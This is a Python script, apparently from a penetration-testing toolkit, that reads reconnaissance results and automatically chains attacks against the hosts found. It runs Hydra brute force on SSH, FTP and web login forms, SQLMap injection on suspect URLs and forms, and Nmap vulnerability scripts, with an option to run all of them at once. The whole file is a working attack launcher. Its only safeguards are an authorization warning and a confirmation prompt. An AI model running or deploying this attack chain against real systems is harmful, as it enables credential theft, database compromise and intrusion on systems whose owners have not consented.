#!/usr/bin/env python3
"""
Brute Force Module — Automated attack chaining based on recon data.
Reads enhanced.json and chains attacks using Hydra, SQLMap, etc.
"""

import os
import sys
import json

# Add recon directory to path for utility imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'recon'))
from utility import (
    console, section_header, status_msg, success_msg,
    error_msg, warning_msg, info_msg, banner, make_table
)
from rich.prompt import Prompt, Confirm

from attack_chain import (
    hydra_ssh, hydra_ftp, hydra_http_form,
    sqlmap_url, sqlmap_form, nmap_vulnscan
)


def load_recon_data(results_dir):
    """Find and load enhanced.json from the most recent scan."""
    if not os.path.exists(results_dir):
        error_msg(f"Results directory not found: {results_dir}")
        return None, None

    # Find all enhanced.json files
    scans = []
    for domain_dir in sorted(os.listdir(results_dir)):
        json_path = os.path.join(results_dir, domain_dir, 'FinalReport', 'enhanced.json')
        if os.path.exists(json_path):
            try:
                with open(json_path, 'r') as f:
                    data = json.load(f)
                scans.append({
                    'dir': domain_dir,
                    'domain': data.get('domain', domain_dir),
                    'timestamp': data.get('timestamp', ''),
                    'path': json_path,
                    'data': data
                })
            except Exception:
                continue

    if not scans:
        error_msg("No scan results found.")
        return None, None

    # Let user select
    if len(scans) == 1:
        return scans[0]['data'], scans[0]['domain']

    console.print()
    for i, scan in enumerate(scans, 1):
        console.print(f"  [cyan]{i}[/cyan] -- {scan['domain']} ({scan['timestamp'][:19]})")
    console.print()

    choice = Prompt.ask("  [bold white]Select scan[/bold white]", default="1")
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(scans):
            return scans[idx]['data'], scans[idx]['domain']
    except ValueError:
        pass

    return scans[0]['data'], scans[0]['domain']


def identify_attack_opportunities(data):
    """Analyze recon data and identify viable attack targets."""
    opportunities = []

    # SSH targets
    for st in data.get('service_targets', []):
        target = st.get('target', {})
        service = target.get('service', '').lower()
        ip = target.get('ip', '')
        port = target.get('port', '')

        if service == 'ssh' or port == '22':
            opportunities.append({
                'type': 'ssh_brute',
                'tool': 'Hydra',
                'ip': ip,
                'port': port or '22',
                'service': 'SSH',
                'description': f'SSH Brute Force on {ip}:{port or 22}',
                'severity': 'high',
                'func': hydra_ssh
            })

        elif service == 'ftp' or port == '21':
            opportunities.append({
                'type': 'ftp_brute',
                'tool': 'Hydra',
                'ip': ip,
                'port': port or '21',
                'service': 'FTP',
                'description': f'FTP Brute Force on {ip}:{port or 21}',
                'severity': 'high',
                'func': hydra_ftp
            })

    # HTTP login forms from web targets
    for wt in data.get('web_targets', []):
        target = wt.get('target', {})
        url = target.get('url', '')

        # Check for login/auth pages in API endpoints
        for ep in wt.get('api_endpoints', []):
            ep_path = ep.get('endpoint', '').lower()
            if any(w in ep_path for w in ['login', 'signin', 'auth', 'admin']):
                info_text = ep.get('info', '')
                if 'Login' in info_text or 'form' in info_text.lower():
                    opportunities.append({
                        'type': 'http_brute',
                        'tool': 'Hydra',
                        'url': url + ep.get('endpoint', ''),
                        'service': 'HTTP Form',
                        'description': f'HTTP Login Brute Force on {url}{ep["endpoint"]}',
                        'severity': 'medium',
                        'func': hydra_http_form
                    })

    # SQLi targets from crawler
    crawler_data = data.get('crawler', {})
    if isinstance(crawler_data, dict):
        for url, cdata in crawler_data.items():
            for sqli in cdata.get('potential_sqli', []):
                sqli_url = sqli.get('url', '')
                sqli_type = sqli.get('type', '')
                score = sqli.get('sqli_score', 0)

                if score >= 2:
                    if sqli_type == 'get_param':
                        opportunities.append({
                            'type': 'sqli_get',
                            'tool': 'SQLMap',
                            'url': sqli_url,
                            'service': 'SQL Injection (GET)',
                            'description': f'SQLMap on {sqli_url} (score: {score})',
                            'severity': 'critical',
                            'func': sqlmap_url
                        })
                    elif sqli_type == 'form':
                        opportunities.append({
                            'type': 'sqli_form',
                            'tool': 'SQLMap',
                            'url': sqli_url,
                            'fields': sqli.get('fields', []),
                            'service': 'SQL Injection (POST)',
                            'description': f'SQLMap Form Injection on {sqli_url} (score: {score})',
                            'severity': 'critical',
                            'func': sqlmap_form
                        })

    # Nmap vuln scan for interesting services
    seen_ips = set()
    for st in data.get('service_targets', []):
        ip = st.get('target', {}).get('ip', '')
        if ip and ip not in seen_ips:
            seen_ips.add(ip)
            opportunities.append({
                'type': 'nmap_vuln',
                'tool': 'Nmap Scripts',
                'ip': ip,
                'service': 'Vulnerability Scan',
                'description': f'Nmap Vuln Scripts on {ip}',
                'severity': 'medium',
                'func': nmap_vulnscan
            })

    # Sort by severity
    sev_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}
    opportunities.sort(key=lambda x: sev_order.get(x.get('severity', 'low'), 4))

    return opportunities


def main():
    banner()
    section_header("BRUTE FORCE MODULE")
    warning_msg("This module launches active attacks. Use only with authorization!")
    console.print()

    # Scan results are saved relative to CWD (e.g. recon/results/<domain>/FinalReport/)
    # Try CWD-relative first, then fallback to script-relative paths
    _cwd_results = os.path.join(os.getcwd(), 'results')
    _script_results = os.path.join(os.path.dirname(__file__), 'results')
    _parent_results = os.path.join(os.path.dirname(__file__), '..', 'results')



    if os.path.isdir(_cwd_results):
        results_dir = _cwd_results
    elif os.path.isdir(_script_results):
        results_dir = _script_results
    else:
        results_dir = _parent_results
    data, domain = load_recon_data(results_dir)

    if not data:
        return

    section_header(f"Attack Planning -- {domain}")

    # Identify opportunities
    opportunities = identify_attack_opportunities(data)

    if not opportunities:
        info_msg("No viable attack targets found from recon data.")
        return

    # Display opportunities
    rows = []
    for i, opp in enumerate(opportunities, 1):
        sev_color = {'critical': 'red', 'high': 'yellow', 'medium': 'blue', 'low': 'dim'}.get(opp['severity'], 'white')
        rows.append((
            str(i),
            opp['tool'],
            opp['service'],
            opp['description'][:60],
            f"[{sev_color}]{opp['severity'].upper()}[/{sev_color}]"
        ))

    make_table(
        "Identified Attack Opportunities",
        [("#", "cyan"), ("Tool", "green"), ("Service", "yellow"), ("Description", "white"), ("Severity", "")],
        rows
    )

    console.print()
    console.print("  [bold white]Options:[/bold white]")
    console.print("    [cyan]a[/cyan] --> Run ALL attacks")
    console.print("    [cyan]1,3,5[/cyan] --> Run specific attacks by number")
    console.print("    [cyan]q[/cyan] --> Quit")
    console.print()

    selection = Prompt.ask("  [bold white]Select attacks[/bold white]", default="q")

    if selection.lower() == 'q':
        info_msg("Aborted.")
        return

    # Parse selection
    selected = []
    if selection.lower() == 'a':
        selected = list(range(len(opportunities)))
    else:
        for part in selection.split(','):
            try:
                idx = int(part.strip()) - 1
                if 0 <= idx < len(opportunities):
                    selected.append(idx)
            except ValueError:
                continue

    if not selected:
        error_msg("No valid attacks selected.")
        return

    # Final confirmation
    console.print()
    warning_msg(f"About to launch {len(selected)} attack(s)!")
    if not Confirm.ask("  [bold red]Proceed?[/bold red]", default=False):
        info_msg("Aborted by user.")
        return

    # Execute attacks
    section_header("Executing Attacks")
    output_dir = os.path.join(results_dir, domain, 'BruteForce')
    os.makedirs(output_dir, exist_ok=True)

    results = []
    for idx in selected:
        opp = opportunities[idx]
        console.print()
        status_msg(f"[{idx+1}] {opp['description']}")

        try:
            result = opp['func'](opp, output_dir)
            results.append({'opportunity': opp['description'], 'result': result})

            if result.get('success'):
                success_msg(f"Attack completed: {result.get('message', 'Done')}")
            else:
                warning_msg(f"Attack returned: {result.get('message', 'No results')}")

        except Exception as e:
            error_msg(f"Attack failed: {e}")
            results.append({'opportunity': opp['description'], 'error': str(e)})

    # Save results
    results_file = os.path.join(output_dir, 'brute_results.json')
    with open(results_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)

    success_msg(f"Brute force results saved to: {results_file}")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n  [bold red]Attacks aborted by user.[/bold red]")
